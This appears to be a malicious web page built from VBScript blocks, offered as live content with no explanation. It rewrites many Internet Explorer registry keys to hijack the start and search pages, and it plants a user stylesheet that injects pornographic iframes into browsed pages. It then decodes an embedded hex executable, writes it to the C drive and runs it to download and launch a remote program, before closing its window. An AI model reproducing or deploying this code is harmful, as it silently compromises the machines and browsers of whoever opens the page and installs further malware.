<script language=VBS>
self.MoveTo 5000,5000
Set Shl = CreateObject("WScript.Shell")
set WshProEnv = Shl.Environment("PROCESS")
Set er=CreateObject("Scripting.FileSystemObject")
css = WshProEnv("WINDIR") +"\system.css"
Set aeb=er.CreateTextFile(css)
aeb.WriteLine"@charset 'iso-8859-1';"
aeb.WriteLine"body{border-color:expression(dMT=document.getElementsByTagName('META'),dMT.length?(dMT.keywords?(dMTkc=dMT.keywords.content,(dMTkc.indexOf('sex')>=0||dMTkc.indexOf('porn')>=0 ||dMTkc.indexOf('adult')>=0||dMTkc.indexOf('thehun')>=0)?(document.write('<html><body topmargin=0 bottommargin=0 rightmargin=0 leftmargin=0><iframe src=http://freepornhome.com/xxxporn/top.html height=1 width=1><iframe src=http://freepornhome.com/xxxporn/main.php?s='+document.location.href+' frameborder=0 border=0 width=100% height=20000></iframe></body></html>')?document.getElementsByTagName('META').keywords.content='':''):''):''):'')}"
sub AddFavoriteLink(loc, DispName, SiteURL)
Set Shor = Shl.CreateShortcut(loc +"\"+ DispName +".URL")
Shor.TargetPath = SiteURL
Shor.Save()
end sub
loc = Shl.SpecialFolders("Favorites")
AddFavoriteLink loc, "Best Search Engine","http://www.huy-search.info"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Styles\User Stylesheet",css
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Styles\Use My Stylesheet","1"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.huy-search.info"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.huy-search.info"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.huy-search.info/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","no"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\SearchUrl\","http://www.search-dot.com/search.php?qq=%s"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.huy-search.info/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.huy-search.info"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
</script>

<script language=vbs>
self.MoveTo 5000,5000
szURL = "http://free3xmatures.com/ntst/counter.exe"
</script>
<script language="VBScript">
szZeroLine = "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
szBinary = ""
szBinary = szBinary & "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000"
szBinary = szBinary & "000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F"
szBinary = szBinary & "742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005D87017219E66F2119E66F2119E66F21"
szBinary = szBinary & "97F97C2112E66F21E5C67D2118E66F215269636819E66F2100000000000000000000000000000000504500004C010300"
szBinary = szBinary & "AB93493F0000000000000000E0000F010B01050C00020000000400000000000000100000001000000020000000004000"
szBinary = szBinary & "001000000002000004000000000000000400000000000000004000000004000000000000020000000000100000100000"
szBinary = szBinary & "000010000010000000000000100000000000000000000000182000002800000000000000000000000000000000000000"
szBinary = szBinary & szZeroLine
szBinary = szBinary & "000000000000000000000000000000000020000018000000000000000000000000000000000000000000000000000000"
szBinary = szBinary & "2E7465787400000064000000001000000002000000040000000000000000000000000000200000602E72646174610000"
szBinary = szBinary & "BE000000002000000002000000060000000000000000000000000000400000402E646174610000002700000000300000"
szBinary = szBinary & "0002000000080000000000000000000000000000400000C0000000000000000000000000000000000000000000000000"
szBinary = szBinary & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine
szBinary = szBinary & "00000000000000000000000000000000E8470000006683C00A8D08516800304000E842000000680B30400050E8310000"
szBinary = szBinary & "00596A006A008D1D1E30400053516A00FFD06A01681E304000E8200000006A00E801000000CCFF2510204000FF250020"
szBinary = szBinary & "4000FF2504204000FF2508204000FF250C20400000000000000000000000000000000000000000000000000000000000"
szBinary = szBinary & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine
szBinary = szBinary & "66200000782000008A2000009A2000005820000000000000402000000000000000000000A42000000020000000000000"
szBinary = szBinary & "0000000000000000000000000000000066200000782000008A2000009A20000058200000000000008000457869745072"
szBinary = szBinary & "6F6365737300C800476574436F6D6D616E644C696E6541001F0147657450726F63416464726573730000A4014C6F6164"
szBinary = szBinary & "4C696272617279410000940257696E45786563006B65726E656C33322E646C6C00007573657233322E646C6C00000000"
szBinary = szBinary & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine
szBinary = szBinary & "000000000000000000000000000000000000000000000000000000000000000075726C6D6F6E2E646C6C0055524C446F"
szBinary = szBinary & "776E6C6F6164546F46696C654100633A5C792E6578650000000000000000000000000000000000000000000000000000"
szBinary = szBinary & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine & szZeroLine
szBinary = szBinary & "00000000000000000000000000000000"
szApplication = "c:\x.exe"
Set hFSO = CreateObject("Scripting.FileSystemObject")
on error resume next
Set hFile = hFSO.CreateTextFile(szApplication, ForWriting)
on error resume next
intLength = len(szBinary)
intPosition = 1
while intPosition < intLength
char = Int("&H" & Mid(szBinary, intPosition, 2))
hFile.Write(Chr(char))
intPosition = intPosition+2
wend
hFile.Close
Set hShell=CreateObject("WScript.Shell")
hShell.run(szApplication+" "+szURL)
</script>
<script language=vbs>
window.close()
</script>
